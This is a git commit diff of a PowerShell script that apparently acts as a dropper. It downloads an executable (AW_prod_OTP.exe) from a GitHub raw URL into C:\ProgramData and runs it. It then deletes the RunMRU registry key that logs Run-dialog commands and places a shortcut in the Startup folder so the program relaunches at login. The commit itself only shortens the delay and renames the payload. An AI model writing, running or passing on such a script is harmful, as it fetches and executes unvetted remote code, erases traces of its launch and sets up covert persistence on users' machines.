8a11cf05392d9a2058aff4d97e860a92509bf694
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2022-02-17 12:44:33 +0800

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,15 +1,15 @@
-Start-Sleep -s 120
+Start-Sleep -s 30
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $down = New-Object System.Net.WebClient
-$url = 'https://github.com/qwertyuiopindia/test/blob/main/AW_prod.exe?raw=true'
-$file = "C:\ProgramData\AW_prod.exe"
+$url = 'https://github.com/qwertyuiopindia/test/blob/main/AW_prod_OTP.exe?raw=true'
+$file = "C:\ProgramData\AW_prod_OTP.exe"
 $down.DownloadFile($url,$file)
 $exec = New-Object -com shell.application
 $exec.shellexecute($file)
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 $objShell = New-Object -ComObject ("WScript.Shell")
-$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\AW_prod.lnk")
-$objShortCut.TargetPath="C:\ProgramData\AW_prod.exe"
+$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\AW_prod_OTP.lnk")
+$objShortCut.TargetPath="C:\ProgramData\AW_prod_OTP.exe"
 $objShortCut.Save()
 exit
 
